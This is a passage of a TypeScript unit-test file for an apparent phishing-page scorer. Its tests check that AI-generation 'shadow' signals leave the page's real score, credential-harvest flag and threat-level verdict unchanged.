    ...sharedRealFields,
    title: "",
    bodyTextSample: "",
    scriptTextSample: "",
    scriptSinkTargets: [],
    commentSamples: [],
    metaGenerator: null,
    svgScriptPayload: false,
    svgDownloadDisguise: false,
  };

  const withShadow = scorePagePhishing(withShadowSignals, ctx);
  const withoutShadow = scorePagePhishing(withoutShadowSignals, ctx);

  it("sanity: the fixture actually fires shadow signals (or the A/B comparison below proves nothing)", () => {
    expect(withShadow.aiSignals.length).toBeGreaterThanOrEqual(7);
    expect(withoutShadow.aiSignals).toEqual([]);
  });

  it("score is identical with and without every shadow signal firing", () => {
    expect(withShadow.score).toBe(withoutShadow.score);
  });

  it("the real fired signal SET is identical (same members, same length)", () => {
    expect(withShadow.signals.sort()).toEqual(withoutShadow.signals.sort());
  });

  it("credentialHarvest is identical", () => {
    expect(withShadow.credentialHarvest).toBe(withoutShadow.credentialHarvest);
    expect(withShadow.credentialHarvest).toBe(true); // sanity the fixture is meaningful
  });

  it("antiBotWallFamily is identical", () => {
    expect(withShadow.antiBotWallFamily).toBe(withoutShadow.antiBotWallFamily);
  });

  it("escalateThreatLevelForPage's verdict is identical from every starting level", () => {
    const levels: PageThreatLevel[] = ["LOW", "MEDIUM", "HIGH", "CRITICAL"];
    for (const current of levels) {
      const a = escalateThreatLevelForPage(current, {
        score: withShadow.score,
        credentialHarvest: withShadow.credentialHarvest,
        antiBotWall: withShadow.signals.includes("anti_bot_wall"),
      });
      const b = escalateThreatLevelForPage(current, {
        score: withoutShadow.score,
        credentialHarvest: withoutShadow.credentialHarvest,
        antiBotWall: withoutShadow.signals.includes("anti_bot_wall"),
      });
      expect(a).toBe(b);
    }
  });

  it("no ShadowSignalKey ever appears in the real `signals` array", () => {
    const shadowKeys = Object.keys(SHADOW_SIGNAL_WEIGHTS) as ShadowSignalKey[];
    expect(shadowKeys.length).toBe(8); // sanity: all eight are covered
    for (const key of shadowKeys) {
      expect(withShadow.signals).not.toContain(key);
    }
  });

  it("SHADOW_CLASS_A_KEYS is exactly the five keys used by the cap arithmetic above (sanity on the fixture's own assumptions)", () => {
    expect([...SHADOW_CLASS_A_KEYS].sort()).toEqual(
      ["llm_refusal_leakage", "unrendered_template_token", "default_scaffold_title", "build_placeholder_text", "agent_scaffold_comment"].sort(),
    );
  });
});
